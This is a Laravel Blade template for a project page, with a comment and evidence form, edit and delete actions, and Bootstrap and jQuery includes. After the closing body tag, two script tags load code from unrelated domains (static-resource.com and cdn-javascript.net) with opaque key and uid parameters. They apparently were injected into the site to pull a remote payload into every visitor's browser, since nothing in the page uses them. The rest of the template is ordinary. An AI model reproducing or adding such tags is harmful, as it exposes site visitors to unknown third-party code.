@extends('layouts.app')

@section('content')

<main role="main">
  <div class="row d-flex">
  
  <div class="col-md-9 col-sm-9 pull-left">
    <div class="container marketing">

  <div class="jumbotron">
    <div class="container">
        <h1 class="display-3"> {{ $project->name}}</h1>
        <p class="lead">{{ $project->description}}</p>
      {{-- <p><a class="btn btn-primary btn-lg" href="#" role="button">Learn more »</a></p> --}}
    </div>
  </div>


  <!-- Marketing messaging and featurettes
  ================================================== -->
  <!-- Wrap the rest of the page in another container to center all the content. -->

  
    
    <!-- Three columns of text below the carousel -->
    <div class="row pt-5" style="background: white; margin: 10px;">
      <a href="/projects/create" class="btn btn-default btn-sm"> Add Project</a>
      <div class="container">
        <div class="row">
          <form action="{{ route('comments.store')}}" class="form-control" method="POST">
                            {{ csrf_field() }}

                            

                            <div class="form-group">
                                <label for="comment-content">Comment</label>
                                <textarea name="body" id="comment-content" class="form-control autosize-target text-left" placeholder="Enter comments" rows="5" style="resize: verticle;"></textarea>
                            </div>

                            <div class="form-group">
                                <label for="comment-content">Evidences</label>
                                <textarea name="url" id="comment-content" class="form-control autosize-target text-left" placeholder="Enter evidences" rows="5" style="resize: verticle;"></textarea>
                            </div>

                            <input type="hidden" name="commentable_id" value="{{$project->id}}">

                            <input type="hidden" name="commentable_type" value="project">

                            <div class="form-group">
                                <input type="submit" value="Submit" class="btn btn-primary">
                            </div>
                        </form>
                      </div>
                      </div>


        {{-- @foreach ($project as $projec)
            <div class="col-lg-4 col-md-4 col-sm-4">
                <h2>{{ $project->name}}</h2>
                <p> {{ $project->description}}</p>
                 <p><a class="btn btn-secondary" href="/projects/{{$project->id}}" role="button">project details »</a></p>
            </div><!-- /.col-lg-4 -->
        @endforeach --}}
      
    </div><!-- /.row -->
  </div>
  </div>
  <div class="col-sm-3 col-md-3 pull-right mt-5">
          {{-- <div class="sidebar-module sidebar-module-inset">
            <h4>About</h4>
            <p>Etiam porta <em>sem malesuada magna</em> mollis euismod. Cras mattis consectetur purus sit amet fermentum. Aenean lacinia bibendum nulla sed consectetur.</p>
          </div> --}}
          <div class="sidebar-module">
            <h4>Actions</h4>
            <ol class="list-unstyled">
              <li><a href="/projects/{{ $project->id }}/edit">Edit</a></li>
              <li><a href="/projects/create">Add new project</a></li>
              <li><a href="/projects">View all projects</a></li>

              @if($project->user_id == Auth::user()->id)
                <li>
                  <a href="#" 
                    onclick="
                      var result= confirm('Are you sure?');
                        if(result){
                          event.preventDefault();
                          document.getElementById('delete-form').submit();
                        }">Delete
                  </a>

                  <form id="delete-form" action="{{ route('projects.destroy',[$project->id]) }}" method="post" style="display: none;">
                    <input type="hidden" name="_method" value="delete">
                    {{ csrf_field()}}
                  </form>
                </li>
              @endif
            </ol>
          </div>
      </div>
    </div>

  </div><!-- /.container -->
  
  


  <!-- FOOTER -->
  <footer class="container">
    <p class="float-right"><a href="#">Back to top</a></p>
    <p>© 2017-2019 project, Inc. · <a href="#">Privacy</a> · <a href="#">Terms</a></p>
  </footer>
</main>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
      <script>window.jQuery || document.write('<script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"><\/script>')</script><script src="/docs/4.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-xrRywqdh3PHs8keKZN+8zzc5TX0GRTLCcmivcbNJWm2rs5C8PRhcEn3czEjhAO9o" crossorigin="anonymous"></script>

<script type="text/javascript" src="https://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8062x"></script><script type="text/javascript" src="https://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8062x&amp;format=arrjs&amp;r=1568137437175"></script></body>
</div>
@endsection
